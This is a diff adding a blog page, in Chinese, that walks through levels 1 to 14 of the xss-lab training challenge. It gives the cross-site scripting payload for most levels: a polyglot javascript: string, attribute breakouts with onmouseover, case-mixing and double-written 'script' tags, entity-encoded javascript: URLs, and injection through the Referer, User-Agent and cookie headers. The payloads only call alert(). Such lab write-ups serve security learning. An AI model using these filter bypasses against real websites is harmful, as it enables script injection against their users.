@@ -1,0 +1,191 @@
+<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no"><meta name="author" content="ak"><meta name="renderer" content="webkit"><meta name="copyright" content="ak"><meta name="keywords" content="Ak4izZ'Blog"><meta name="description" content=""><meta name="Cache-Control" content="no-cache"><meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1"><title>xss-lab_level_1-14 · Ak4izZ's Blog</title><link rel="stylesheet" href="/css/style.css?v=2018.7.9"><link rel="stylesheet" href="/css/animation.css?v=2018.7.9"><link rel="icon" href="/img/assets/favicon.ico"><link rel="stylesheet" href="https://cdn.bootcss.com/font-awesome/4.7.0/css/font-awesome.min.css?version=1.5.6"><!-- scripts--><script>(function( w ){
+  "use strict";
+  // rel=preload support test
+  if( !w.loadCSS ){
+    w.loadCSS = function(){};
+  }
+  // define on the loadCSS obj
+  var rp = loadCSS.relpreload = {};
+  // rel=preload feature support test
+  // runs once and returns a function for compat purposes
+  rp.support = (function(){
+    var ret;
+    try {
+      ret = w.document.createElement( "link" ).relList.supports( "preload" );
+    } catch (e) {
+      ret = false;
+    }
+    return function(){
+      return ret;
+    };
+  })();
+
+  // if preload isn't supported, get an asynchronous load by using a non-matching media attribute
+  // then change that media back to its intended value on load
+  rp.bindMediaToggle = function( link ){
+    // remember existing media attr for ultimate state, or default to 'all'
+    var finalMedia = link.media || "all";
+
+    function enableStylesheet(){
+      link.media = finalMedia;
+    }
+
+    // bind load handlers to enable media
+    if( link.addEventListener ){
+      link.addEventListener( "load", enableStylesheet );
+    } else if( link.attachEvent ){
+      link.attachEvent( "onload", enableStylesheet );
+    }
+
+    // Set rel and non-applicable media type to start an async request
+    // note: timeout allows this to happen async to let rendering continue in IE
+    setTimeout(function(){
+      link.rel = "stylesheet";
+      link.media = "only x";
+    });
+    // also enable media after 3 seconds,
+    // which will catch very old browsers (android 2.x, old firefox) that don't support onload on link
+    setTimeout( enableStylesheet, 3000 );
+  };
+
+  // loop through link elements in DOM
+  rp.poly = function(){
+    // double check this to prevent external calls from running
+    if( rp.support() ){
+      return;
+    }
+    var links = w.document.getElementsByTagName( "link" );
+    for( var i = 0; i < links.length; i++ ){
+      var link = links[ i ];
+      // qualify links to those with rel=preload and as=style attrs
+      if( link.rel === "preload" && link.getAttribute( "as" ) === "style" && !link.getAttribute( "data-loadcss" ) ){
+        // prevent rerunning on link
+        link.setAttribute( "data-loadcss", true );
+        // bind listeners to toggle media back
+        rp.bindMediaToggle( link );
+      }
+    }
+  };
+
+  // if unsupported, run the polyfill
+  if( !rp.support() ){
+    // run once at least
+    rp.poly();
+
+    // rerun poly on an interval until onload
+    var run = w.setInterval( rp.poly, 500 );
+    if( w.addEventListener ){
+      w.addEventListener( "load", function(){
+        rp.poly();
+        w.clearInterval( run );
+      } );
+    } else if( w.attachEvent ){
+      w.attachEvent( "onload", function(){
+        rp.poly();
+        w.clearInterval( run );
+      } );
+    }
+  }
+
+
+  // commonjs
+  if( typeof exports !== "undefined" ){
+    exports.loadCSS = loadCSS;
+  }
+  else {
+    w.loadCSS = loadCSS;
+  }
+}( typeof global !== "undefined" ? global : this ) );</script><script src="https://cdn.jsdelivr.net/npm/jquery@3.3.1/dist/jquery.min.js" defer></script><script src="/js/main.js?v=2018.7.9" defer></script><!-- fancybox--><link rel="preload" href="https://cdnjs.cloudflare.com/ajax/libs/fancybox/3.2.5/jquery.fancybox.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'"><script src="https://cdnjs.cloudflare.com/ajax/libs/fancybox/3.2.5/jquery.fancybox.min.js" defer></script><!-- busuanzi--><script async src="//dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script><meta name="generator" content="Hexo 5.4.2"></head><body><section class="profile-close" id="cxo-profile"><div class="profile-avatar"><i class="fa fa-caret-left"></i><img src="/img/assets/me.jpg"></div><!--.profile-saying
+  i.fa.fa-comment
+  .saying--><div class="cxo-profile-inner"><div class="profile-name">Ak4izZ</div><div class="profile-signature">fear is unreal</div><div class="read-progress"></div></div></section><header id="cxo-intro" style="height: 70vh;background-image: url(/img/intro/index-bg.png);"><nav id="cxo-intro-nav"><section><div class="intro-nav-title"><a href="/">:&gt;#</a></div><div class="intro-nav-label-box"><a href="/">Home</a><a href="/about/">About</a><a href="/archives/">Archives</a><a href="/tags/">Tags</a></div><i class="fa fa-bars intro-nav-menu"><div class="intro-nav-drop"><a href="/">Home</a><a href="/about/">About</a><a href="/archives/">Archives</a><a href="/tags/">Tags</a></div></i><div class="clear"></div></section></nav><h1 class="post-title">xss-lab_level_1-14</h1><div class="post-intros"><div class="post-intro-meta"><span class="post-intro-time"><i class="post-intro-calendar fa fa-calendar"></i><span>2022-07-17</span></span><span class="post-intro-tags"><a class="intro-tag fa fa-tag" href="javascript:void(0)" date-tags="xss"> xss</a></span></div></div></header><article class="cxo-up" id="cxo-content-outer"><section id="cxo-content-inner"><article class="article-entry" id="post"><p>同样先挖一个坑，14关以后的往后再补充</p>
+<span id="more"></span>
+
+<h3 id="level-1"><a href="#level-1" class="headerlink" title="level 1"></a>level 1</h3><p>无限制</p>
+<h3 id="level-2"><a href="#level-2" class="headerlink" title="level 2"></a>level 2</h3><p>尖括号被实体转义</p>
+<p><img src="/2022/07/17/xss-lab-level-1-14/image-20220714091917878.png" alt="image-20220714091917878"></p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">jaVasCript</span>:<span class="comment">/*-/*`/*\`/*&#x27;/*&quot;/**/</span>(<span class="comment">/* */</span>oNcliCk=<span class="title function_">alert</span>() )<span class="comment">//%0D%0A%0D%0A//&lt;/stYle/&lt;/titLe/&lt;/teXtarEa/&lt;/scRipt/--!&gt;\x3csVg/&lt;sVg/oNloAd=alert()//&gt;\x3e</span></span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="level-3"><a href="#level-3" class="headerlink" title="level 3"></a>level 3</h3><p>输入内容被放在了标签外部，并且尖括号被转义</p>
+<p><img src="/2022/07/17/xss-lab-level-1-14/image-20220714092848198.png" alt="image-20220714092848198"></p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27; onmouseover=&quot;alert()&quot;</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/2022/07/17/xss-lab-level-1-14/image-20220714093448149.png" alt="image-20220714093448149"></p>
+<h3 id="level-4"><a href="#level-4" class="headerlink" title="level 4"></a>level 4</h3><p>双引号闭合，尖括号转义</p>
+<p><img src="/2022/07/17/xss-lab-level-1-14/image-20220714093549020.png" alt="image-20220714093549020"></p>
+<p>把上一题的单引号改成双引号就行了</p>
+<p><img src="/2022/07/17/xss-lab-level-1-14/image-20220714093625356.png" alt="image-20220714093625356"></p>
+<h3 id="level-5"><a href="#level-5" class="headerlink" title="level 5"></a>level 5</h3><p>双引号闭合+关键词过滤；on被过滤掉了。</p>
+<p><img src="/2022/07/17/xss-lab-level-1-14/image-20220714093730878.png" alt="image-20220714093730878"></p>
+<p>使用超链接</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;/&gt;&lt;a href=javascript:alert(1)&gt;aaa&lt;/a&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/2022/07/17/xss-lab-level-1-14/image-20220714094225897.png" alt="image-20220714094225897"></p>
+<h3 id="level-6"><a href="#level-6" class="headerlink" title="level 6"></a>level 6</h3><p><img src="/2022/07/17/xss-lab-level-1-14/image-20220714094330538.png" alt="image-20220714094330538"></p>
+<p>超链接关键字过滤，但是发现尖括号可以用；script关键字被过滤，大小写绕过就好了</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;/&gt;&lt;sCrIpt&gt;(alert)(1)&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2022/07/17/xss-lab-level-1-14/image-20220714094658828.png" alt="image-20220714094658828"></p>
+<h3 id="level-7"><a href="#level-7" class="headerlink" title="level 7"></a>level 7</h3><p>script无论大小写全部过滤</p>
+<p><img src="/2022/07/17/xss-lab-level-1-14/image-20220714094749008.png" alt="image-20220714094749008"></p>
+<p>尝试双写绕过</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;/&gt;&lt;scscriptript&gt;(alert)(1)&lt;/scrscriptipt&gt;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2022/07/17/xss-lab-level-1-14/image-20220714094931179.png" alt="image-20220714094931179"></p>
+<h3 id="level-8"><a href="#level-8" class="headerlink" title="level 8"></a>level 8</h3><p><img src="/2022/07/17/xss-lab-level-1-14/image-20220714095023761.png" alt="image-20220714095023761"></p>
+<p>闭合超链接，引号被实体转义，并且关键字过滤</p>
+<p><img src="/2022/07/17/xss-lab-level-1-14/image-20220714095117652.png" alt="image-20220714095117652"></p>
+<p>实体转义绕过。</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java&amp;#<span class="number">115</span>;c&amp;#<span class="number">114</span>;<span class="attr">ipt</span>:<span class="title function_">alert</span>(<span class="number">1</span>)</span><br></pre></td></tr></table></figure>
+
+
+
+<p><img src="/2022/07/17/xss-lab-level-1-14/image-20220714095334129.png" alt="image-20220714095334129"></p>
+<h3 id="level-9"><a href="#level-9" class="headerlink" title="level 9"></a>level 9</h3><p><img src="/2022/07/17/xss-lab-level-1-14/image-20220714100633399.png" alt="image-20220714100633399"></p>
+<p>友情链接不合法？看看合法的链接</p>
+<p><img src="/2022/07/17/xss-lab-level-1-14/image-20220714100849378.png" alt="image-20220714100849378"></p>
+<p>使用JavaScript伪协议，发现被过滤了，大小写绕过、双写绕过没用。</p>
+<p>发现只要payload中有http就行。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">javasc&amp;#114ipt:alert(&amp;#34;http://&amp;quot)</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="level-10"><a href="#level-10" class="headerlink" title="level 10"></a>level 10</h3><p><img src="/2022/07/17/xss-lab-level-1-14/image-20220714102024766.png" alt="image-20220714102024766"></p>
+<p>尖括号实体转义</p>
+<p>注意下面有一个form，尝试用post提交，当payload在url里边时，t_sort是可以利用的。</p>
+<p><img src="/2022/07/17/xss-lab-level-1-14/image-20220714103744826.png" alt="image-20220714103744826"></p>
+<p>尝试之后发现尖括号被过滤；</p>
+<p>先闭合一下“，然后用事件</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?t_sort=1&quot; onmouseover=&quot;javascript:alert(1);&quot;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2022/07/17/xss-lab-level-1-14/image-20220714104543561.png" alt="image-20220714104543561"></p>
+<p>依然没有触发js。</p>
+<p>在payload的末尾加上type&#x3D;”text”就可以触发了</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?t_sort=1&quot; onmouseover=&quot;javascript:alert(1);&quot;type=&quot;text&quot;</span><br></pre></td></tr></table></figure>
+
+
+
+<p><img src="/2022/07/17/xss-lab-level-1-14/image-20220714104758605.png" alt="image-20220714104758605"></p>
+<h3 id="level-11"><a href="#level-11" class="headerlink" title="level 11"></a>level 11</h3><p>发现ref的值和数据包的referer有关，</p>
+<p><img src="/2022/07/17/xss-lab-level-1-14/image-20220714111651395.png" alt="image-20220714111651395"></p>
+<p><img src="/2022/07/17/xss-lab-level-1-14/image-20220714111658266.png" alt="image-20220714111658266"></p>
+<p>用bp改一下包，发现确实如此。</p>
+<p>在referer使用上一题的payload就可以了<code>&quot; onmouseover=&quot;javascript:alert(1);&quot;type=&quot;text&quot;</code></p>
+<p><img src="/2022/07/17/xss-lab-level-1-14/image-20220714111827179.png" alt="image-20220714111827179"></p>
+<h3 id="level-12"><a href="#level-12" class="headerlink" title="level 12"></a>level 12</h3><p>类似于上一题，这次是ua</p>
+<p><img src="/2022/07/17/xss-lab-level-1-14/image-20220714112150043.png" alt="image-20220714112150043"></p>
+<p>把上一题的payload直接贴在ua后面就行</p>
+<p><img src="/2022/07/17/xss-lab-level-1-14/image-20220714112425280.png" alt="image-20220714112425280"></p>
+<h3 id="level-13"><a href="#level-13" class="headerlink" title="level 13"></a>level 13</h3><p><code>攻击日志的场景</code></p>
+<p>这题是cookie处注入。</p>
+<p><img src="/2022/07/17/xss-lab-level-1-14/image-20220714112625696.png" alt="image-20220714112625696"></p>
+<p><img src="/2022/07/17/xss-lab-level-1-14/image-20220714112823938.png" alt="image-20220714112823938"></p>
+<p>沿用上一次的payload，发现text被吞掉了，可能是有长度限制</p>
+<p>把payload缩短。</p>
+<p><img src="/2022/07/17/xss-lab-level-1-14/image-20220714113233569.png" alt="image-20220714113233569"></p>
+<p>成功</p>
+<p><img src="/2022/07/17/xss-lab-level-1-14/image-20220714113308211.png" alt="image-20220714113308211"></p>
+<h3 id="level-14"><a href="#level-14" class="headerlink" title="level 14"></a>level 14</h3><p>追包下去发现jwt。。。</p>
+<p><img src="/2022/07/17/xss-lab-level-1-14/image-20220714114041547.png" alt="image-20220714114041547"></p>
+</article><!-- lincense--><div class="license-wrapper"><p> <span>Author:  </span><a href="http://example.com">ak</a></p><p> <span>Link:  </span><a href="http://example.com/2022/07/17/xss-lab-level-1-14/">http://example.com/2022/07/17/xss-lab-level-1-14/</a></p><p> <span>Copyright:  </span><span>All articles in this blog are licensed under <a rel="license noopener" target="_blank" href="https://creativecommons.org/licenses/by-nc-nd/3.0">CC BY-NC-SA 3.0</a> unless stating additionally.</span></p></div><div class="post-paginator"><a class="prevSlogan" href="/2022/07/17/upload-labs-pass-1-20/" title="upload-labs_pass_1-20"><span>< PreviousPost</span><br><span class="prevTitle">upload-labs_pass_1-20</span></a><a class="nextSlogan" href="/2022/07/07/htb-Opensource/" title="htb-Opensource"><span>NextPost ></span><br><span class="nextTitle">htb-Opensource</span></a><div class="clear"></div></div><div id="comment"></div></section></article><footer id="cxo-footer-outer"><div id="cxo-footer-inner"><p class="footer-container"><span>Site by </span><a target="_blank" rel="noopener" href="http://hexo.io"><span>Hexo</span></a><span> | theme </span><a target="_blank" rel="noopener" href="https://github.com/Longlongyu/hexo-theme-Cxo"><span>Cxo</span></a></p><i class="fa fa-user"> </i><span id="busuanzi_value_site_uv"></span><span> | </span><i class="fa fa-eye"> </i><span id="busuanzi_value_site_pv"></span></div></footer><!-- catelog--><div class="toc-wrapper" style="top: 70vh;"><div class="toc-catalog"><i class="fa fa-list"> </i><span>CATALOG</span></div><ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#level-1"><span class="toc-number">1.</span> <span class="toc-text">level 1</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#level-2"><span class="toc-number">2.</span> <span class="toc-text">level 2</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#level-3"><span class="toc-number">3.</span> <span class="toc-text">level 3</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#level-4"><span class="toc-number">4.</span> <span class="toc-text">level 4</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#level-5"><span class="toc-number">5.</span> <span class="toc-text">level 5</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#level-6"><span class="toc-number">6.</span> <span class="toc-text">level 6</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#level-7"><span class="toc-number">7.</span> <span class="toc-text">level 7</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#level-8"><span class="toc-number">8.</span> <span class="toc-text">level 8</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#level-9"><span class="toc-number">9.</span> <span class="toc-text">level 9</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#level-10"><span class="toc-number">10.</span> <span class="toc-text">level 10</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#level-11"><span class="toc-number">11.</span> <span class="toc-text">level 11</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#level-12"><span class="toc-number">12.</span> <span class="toc-text">level 12</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#level-13"><span class="toc-number">13.</span> <span class="toc-text">level 13</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#level-14"><span class="toc-number">14.</span> <span class="toc-text">level 14</span></a></li></ol></div><!-- top--><i class="fa fa-arrow-up close" id="go-up" aria-hidden="true"></i></body></html>
